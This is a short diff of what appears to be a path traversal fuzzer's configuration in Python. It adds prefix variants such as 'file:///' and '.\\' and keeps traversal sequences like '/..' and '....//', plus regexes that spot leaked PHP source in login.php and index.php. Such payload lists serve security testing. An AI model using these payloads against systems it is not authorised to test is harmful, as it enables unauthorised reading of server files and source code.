@@ -1,11 +1,14 @@
-# https://www.owasp.org/index.php/Path_Traversal
-
-dotvar = (
+befvar = (
+"./",
+"",
+".\\",
+"file:",
 "file:/",
 "file://",
 "file:///",
-"./",
-"/",
+)
+
+dotvar = (
 "/..",
 "....//",
 "//....",
@@ -41,4 +44,3 @@ match = {
 "login.php": "\<\?php|\$_GET|\$_POST|\$_COOKIE|\$_REQUEST|\$_FILES|\$_SESSION|\$_SERVER|\$_ENV",
 "index.php": "\<\?php|\$_GET|\$_POST|\$_COOKIE|\$_REQUEST|\$_FILES|\$_SESSION|\$_SERVER|\$_ENV",
 }
-
